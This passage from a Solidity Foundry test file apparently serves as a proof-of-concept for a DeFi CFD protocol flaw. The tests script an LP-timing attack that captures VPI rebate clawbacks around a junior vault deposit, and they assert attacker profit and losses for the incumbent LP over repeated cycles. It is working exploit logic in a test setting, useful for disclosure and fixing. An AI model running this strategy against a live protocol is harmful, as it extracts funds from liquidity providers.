            Outcome memory cycle = _runLpTimingScenario(true);
            cumulativeAttacker += cycle.attackerDelta;
            cumulativeVictim += cycle.victimDelta;
            console2.log("cycle", i + 1);
            console2.log("  reserve", cycle.vpiReserve);
            console2.log("  attacker delta", cycle.attackerDelta);
            console2.log("  victim delta", cycle.victimDelta);
            assertGt(cycle.vpiReserve, 40_000e6, "same standing skew funds every cycle");
            assertGt(cycle.attackerDelta, 8_000e6, "every cycle remains profitable");
            assertEq(_sideOpenInterest(CfdTypes.Side.LONG), BOOK_SIZE, "standing LONG survives cycle");
            assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "SHORT returns to zero each cycle");
        }
        console2.log("three-cycle attacker delta", cumulativeAttacker);
        console2.log("three-cycle victim delta", cumulativeVictim);
        assertGt(cumulativeAttacker, 35_000e6, "three cycles extract more than 35k USDG");
        assertLt(cumulativeVictim, -60_000e6, "three cycles remove more than 60k from incumbent Junior");
    }

    /// @notice Counts the three setup accounts as one economic attacker, including all build fees, adverse-confidence
    ///         execution, setup VPI, and projected carry on the standing LONG. The oracle price is held constant; in a
    ///         live attack the standing LONG's directional price risk must be hedged off-protocol.
    function test_selfBuiltSkewAmortizesAllSetupCostsWithinTenCycles() public {
        _configureReleaseAndFundActors();

        // Supply the reusable LP capital before the baseline so minting cannot masquerade as attack profit.
        settlementToken.mint(ATTACKER, ATTACKER_LP_ASSETS);
        int256 attackerStart = _selfBuiltAttackerMarkedWealth();
        uint256 victimStart = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP));

        _buildStandingSkewThroughRouter();
        int256 setupDelta = _selfBuiltAttackerMarkedWealth() - attackerStart;
        console2.log("SELF-BUILT setup delta", setupDelta);
        assertLt(setupDelta, 0, "self-built book pays every setup cost before cycling");

        uint256 breakEvenCycle;
        for (uint256 i; i < 10; ++i) {
            Outcome memory cycle = _runLpTimingScenarioWithFunding(true, false);
            int256 cumulativeAttacker = _selfBuiltAttackerMarkedWealth() - attackerStart;
            int256 cumulativeVictim = int256(juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP)))
                - int256(victimStart);
            console2.log("SELF-BUILT cycle", i + 1);
            console2.log("  cycle entrant delta", cycle.attackerDelta);
            console2.log("  cumulative attacker delta", cumulativeAttacker);
            console2.log("  cumulative victim delta", cumulativeVictim);
            if (breakEvenCycle == 0 && cumulativeAttacker > 0) {
                breakEvenCycle = i + 1;
            }
        }

        console2.log("SELF-BUILT break-even cycle", breakEvenCycle);
        assertGt(breakEvenCycle, 0, "ten cycles amortize every self-built setup cost");
        assertLe(breakEvenCycle, 10, "break-even occurs within about one day of hourly epochs");

        // Flatten the setup LONG so the final number contains no unrealized protocol position value.
        _routerClose(LONG_TRADER, CfdTypes.Side.LONG, BOOK_SIZE);
        int256 flatAttackerDelta = _selfBuiltAttackerMarkedWealth() - attackerStart;
        int256 finalVictimDelta = int256(juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP)))
            - int256(victimStart);
        console2.log("SELF-BUILT all-flat attacker delta", flatAttackerDelta);
        console2.log("SELF-BUILT final victim delta", finalVictimDelta);
        assertGt(flatAttackerDelta, 0, "self-built attack remains profitable after flattening the standing leg");
        assertLt(finalVictimDelta, -100_000e6, "ten cycles cause material incumbent loss");
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), 0, "self-built LONG flattened");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "no residual SHORT");
    }

    function _configureReleaseAndBuildStandingSkew() internal {
        _configureReleaseAndFundActors();
        _buildStandingSkewThroughRouter();
    }

    function _configureReleaseAndFundActors() internal {
        // Release pool and Router parameters. Engine fee (4 bps), buffer (25 bps), and frozen spread (50 bps)
        // are constructor defaults; risk parameters are supplied by _riskParams above.
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen spread");
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.basketMaxConfidenceRatioBps = 10;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        _setRouterConfig(config);

        vm.warp(T0);
        vm.deal(KEEPER, 10 ether);
        bytes[] memory initialPriceData = _releasePriceData();
        vm.prank(KEEPER);
        router.updateMarkPrice(initialPriceData);

        _fundVictimJuniorThroughRouter();
        _fundTrader(LONG_TRADER, 250_000e6);
        _fundTrader(SHORT_TRADER, 250_000e6);
        _fundTrader(ATTACKER, 250_000e6);
    }

    function _buildStandingSkewThroughRouter() internal {
        // Build a 9.8M/9.8M balanced book through cap-compliant increments. Every temporary open skew is <=3.9M,
        // below 40% of the ~10M depth. All commits and fills use the public Router with the release 10-bp confidence
        // cap and 25% adverse-confidence multiplier.
        _routerOpen(LONG_TRADER, CfdTypes.Side.LONG, 39_000 * LOT, BUILD_MARGIN);
        _routerOpen(SHORT_TRADER, CfdTypes.Side.SHORT, 39_000 * LOT, BUILD_MARGIN);
        _routerOpen(LONG_TRADER, CfdTypes.Side.LONG, 39_000 * LOT, BUILD_MARGIN);
        _routerOpen(SHORT_TRADER, CfdTypes.Side.SHORT, 39_000 * LOT, BUILD_MARGIN);
        _routerOpen(LONG_TRADER, CfdTypes.Side.LONG, 20_000 * LOT, BUILD_MARGIN);
        _routerOpen(SHORT_TRADER, CfdTypes.Side.SHORT, 20_000 * LOT, BUILD_MARGIN);
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), BOOK_SIZE, "balanced LONG built");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), BOOK_SIZE, "balanced SHORT built");

        // A normal risk-reducing close is not subject to the opening skew cap. It leaves 9.8M one-sided LONG OI,
        // roughly 98% of pool depth, while the maximum common-mark liability remains below pool backing.
        _routerClose(SHORT_TRADER, CfdTypes.Side.SHORT, BOOK_SIZE);
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), BOOK_SIZE, "standing LONG remains");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "SHORT close creates over-cap skew");
        assertGt(BOOK_LOTS * PRICE, (pool.totalAssets() * 4) / 10, "skew exceeds opening cap");
        assertLt(_maxLiability(), pool.totalAssets(), "standing book remains raw-solvent");
    }

    function _runLpTimingScenario(
        bool straddleActivation
    ) internal returns (Outcome memory out) {
        return _runLpTimingScenarioWithFunding(straddleActivation, true);
    }

    function _runLpTimingScenarioWithFunding(
        bool straddleActivation,
        bool mintLpCapital
    ) internal returns (Outcome memory out) {
        // Give the attacker identical trader and LP capital in both branches, then snapshot economic wealth.
        if (mintLpCapital) {
            settlementToken.mint(ATTACKER, ATTACKER_LP_ASSETS);
        }
        vm.prank(ATTACKER);
        settlementToken.approve(address(juniorVault), ATTACKER_LP_ASSETS);

        uint256 victimBefore = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP));
        uint256 attackerBefore = _attackerWealth();
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        vm.prank(ATTACKER);
        uint256 depositRequestId = juniorVault.requestDeposit(ATTACKER_LP_ASSETS, ATTACKER, ATTACKER);
        uint256 activationTime = juniorVault.depositEpochStart(depositRequestId);

        vm.warp(activationTime - 30);
        uint256 poolBeforeOpen = pool.totalAssets();
        _routerOpen(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE, ATTACK_MARGIN);
        out.vpiReserve = clearinghouse.vpiRebateReserveAssets(ATTACKER);
        out.poolDropWhileReserved = poolBeforeOpen - pool.totalAssets();
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        assertLt(vpiAccrued, 0, "risk-reducing open has negative lifetime VPI");
        assertEq(out.vpiReserve, uint256(-vpiAccrued), "reserve exactly backs guaranteed clawback");

        if (!straddleActivation) {
            // Control: settle the same position before LP activation. The reserve leaves and returns before shares
            // are priced, so the entrant cannot capture it.
            _routerClose(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE);
            assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "control clawback settled pre-entry");
        }

        vm.warp(activationTime);
        _settleLpEpochThroughRouter();
        uint256 claimableDeposit = juniorVault.claimableDepositRequest(depositRequestId, ATTACKER);
        assertEq(claimableDeposit, ATTACKER_LP_ASSETS, "deposit activated at boundary NAV");
        vm.prank(ATTACKER);
        uint256 mintedShares =
            juniorVault.claimDeposit(depositRequestId, claimableDeposit, ATTACKER, ATTACKER);
        assertGt(mintedShares, 0, "attacker receives Junior shares");

        if (straddleActivation) {
            // Attack: the lifetime clamp forces the entire pre-entry rebate back to HousePool even though this deposit
            // has nearly doubled current depth. That restoration is now shared with the newly activated shares.
            _routerClose(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE);
            assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "guaranteed reserve clawed back post-entry");
        }

        // Observe the production one-hour deposit cooldown, request before the epoch cutoff, then fund and claim the
        // full redemption through Router LP settlement. The added 10M cash makes the claim fit beside 9.8M liability.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 2);
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemRequestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        vm.warp(redeemRequestId * 1 hours);
        _settleLpEpochThroughRouter();
        out.redeemedAssets = juniorVault.claimableRedeemAssets(redeemRequestId, ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.withdraw(out.redeemedAssets, ATTACKER, ATTACKER);

        uint256 victimAfter = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM_LP));
        uint256 attackerAfter = _attackerWealth();
        out.victimDelta = int256(victimAfter) - int256(victimBefore);
        out.attackerDelta = int256(attackerAfter) - int256(attackerBefore);
        out.treasuryDelta = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
    }

    function _routerOpen(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, 0, false);
        _execute(id);
    }

    function _routerClose(
        address account,
        CfdTypes.Side side,
        uint256 size
    ) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, 0, 0, true);
        _execute(id);
    }

    function _execute(
        uint64 id
    ) internal {
        bytes[] memory data = _releasePriceData();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router order executes");
    }

    function _settleLpEpochThroughRouter() internal {
        bytes[] memory data = _releasePriceData();
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _fundVictimJuniorThroughRouter() internal {
        settlementToken.mint(VICTIM_LP, VICTIM_ASSETS);
        vm.startPrank(VICTIM_LP);
        settlementToken.approve(address(juniorVault), VICTIM_ASSETS);
        uint256 requestId = juniorVault.requestDeposit(VICTIM_ASSETS, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleLpEpochThroughRouter();
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, VICTIM_LP);
        assertEq(claimableAssets, VICTIM_ASSETS, "victim deposit activates through Router");
        vm.prank(VICTIM_LP);
        juniorVault.claimDeposit(requestId, claimableAssets, VICTIM_LP, VICTIM_LP);
    }

    function _releasePriceData() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        uint64 confidence = uint64((PRICE * 10) / 10_000); // release basket confidence cap: 10 bps
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(PRICE)),
            confidence,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(PRICE);
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    }

    /// @dev Marked economic wealth for all addresses controlled by the self-built attacker. For a live position, the
    ///      Account Lens projects elapsed carry and exact price PnL into net equity. Replacing the raw position-margin
    ///      bucket with that signed equity counts both adverse execution and carry while retaining free/other reserves.
    function _selfBuiltAttackerMarkedWealth() internal view returns (int256 wealth) {
        wealth = _markedAccountWealth(LONG_TRADER) + _markedAccountWealth(SHORT_TRADER)
            + _markedAccountWealth(ATTACKER);
        wealth += int256(juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER)));
    }

    function _markedAccountWealth(
        address account
    ) internal view returns (int256 wealth) {
        AccountLensViewTypes.AccountLedgerSnapshot memory snapshot =
            engineAccountLens.getAccountLedgerSnapshot(account);
        wealth = int256(settlementToken.balanceOf(account));
        if (!snapshot.hasPosition) {
            return wealth + int256(snapshot.settlementBalanceAssets + snapshot.traderClaimBalanceAssets);
        }
        wealth += int256(snapshot.settlementBalanceAssets - snapshot.activePositionMarginAssets);
        wealth += snapshot.netEquityAssets;
    }
}
```

